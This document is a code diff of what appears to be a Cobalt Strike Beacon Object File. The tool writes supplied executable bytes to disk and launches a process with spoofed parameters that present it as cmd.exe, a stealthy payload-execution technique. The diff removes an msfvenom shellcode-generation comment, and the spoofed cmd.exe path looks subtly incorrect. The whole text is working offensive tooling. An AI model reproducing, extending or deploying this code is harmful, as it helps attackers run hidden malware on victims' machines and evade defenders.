@@ -821,14 +821,13 @@ BOOL WriteRemoteProcessParameters(
 void go(char* buff, int len) {
     datap parser;
     char* peName;
-    // Example of creating a raw shellcode payload with msfvenom
-    //   msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o popCalc.bin
-    unsigned char* shellcode;
-    SIZE_T shellcode_len;
+    unsigned char* pebytes;
+    SIZE_T pebytes_len;
 
     BeaconDataParse(&parser, buff, len);
-    shellcode_len = BeaconDataLength(&parser);
-    shellcode = (unsigned char*)BeaconDataExtract(&parser, NULL);
+    peName = BeaconDataExtract(&parser, NULL);
+    pebytes_len = BeaconDataLength(&parser);
+    pebytes = (unsigned char*)BeaconDataExtract(&parser, NULL);
     // Declare variables / structs
     HANDLE hProc = NULL;
     // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
@@ -842,10 +841,10 @@ void go(char* buff, int len) {
     //ULONG_PTR dwData = NULL;
     SIZE_T bytesWritten;
 
-    BeaconPrintf(CALLBACK_OUTPUT, "shellcode len: %d\n", shellcode_len);
-    BeaconPrintf(CALLBACK_OUTPUT, "shellcode addr: 0x%p\n", shellcode);
+    BeaconPrintf(CALLBACK_OUTPUT, "pe bytes len: %d\n", pebytes_len);
+    BeaconPrintf(CALLBACK_OUTPUT, "pe bytes addr: 0x%p\n", pebytes);
 
-    HANDLE targetFileHandle = KERNEL32$CreateFileA("C:\\Users\\Administrator\\Desktop\\myfile2.exe",
+    HANDLE targetFileHandle = KERNEL32$CreateFileA(peName,
         GENERIC_READ | GENERIC_WRITE,
         FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
         NULL,
@@ -863,7 +862,7 @@ void go(char* buff, int len) {
         BeaconPrintf(CALLBACK_OUTPUT, "Success CreateFile targetFileHandle 0x%p\n", targetFileHandle);
     
     }
-    if(!CopyBytesByHandle(shellcode, shellcode_len, targetFileHandle)){
+    if(!CopyBytesByHandle(pebytes, pebytes_len, targetFileHandle)){
         KERNEL32$CloseHandle(targetFileHandle);
         return;
     }
@@ -950,12 +949,12 @@ void go(char* buff, int len) {
 
     if(!WriteRemoteProcessParameters(
         processHandle,
-        L"C:\\Users\\Administrator\\Desktop\\myfile2.exe",
+        L"C:\\Users\\Windows\\System32\\cmd.exe",
         L"",
         L"",
-        L"\"C:\\Users\\Administrator\\Desktop\\myfile2.exe\"",
+        L"\"C:\\Users\\Windows\\System32\\cmd.exe\"",
         NtCurrentTeb()->ProcessEnvironmentBlock->ProcessParameters->Environment,
-        L"C:\\Users\\Administrator\\Desktop\\myfile2.exe",
+        L"C:\\Users\\Windows\\System32\\cmd.exe",
         L"WinSta0\\Default",
         L"",
         L"")){
